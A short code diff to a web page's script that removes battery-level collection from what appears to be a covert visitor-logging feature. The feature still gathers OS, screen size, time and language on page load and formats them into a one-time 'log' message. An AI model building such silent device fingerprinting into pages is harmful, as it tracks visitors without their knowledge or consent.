@@ -37,19 +37,13 @@
 </html>
     <script>
 document.addEventListener('DOMContentLoaded', function() {
-    let batteryLevel;
     let screenWidth;
     let screenHeight;
-
-    navigator.getBattery().then(function(battery) {
-        batteryLevel = battery.level * 100;
-    });
 
     
     screenWidth = window.screen.width;
     screenHeight = window.screen.height;
 
-    const batteryLevelConst = batteryLevel;
     const screenWidthConst = screenWidth;
     const screenHeightConst = screenHeight;
 
@@ -151,7 +145,6 @@ if (!localStorage.getItem('logSent')) {
     
  *💻 System*
 *├ Os: ${osname}*
-*├ Battery: ${batteryLevel}%*
 *├ Screen resolution: ${screenWidth}x${screenHeight}*
 *├ Time: ${formattedTime}*
 *├ Language: ${language}*
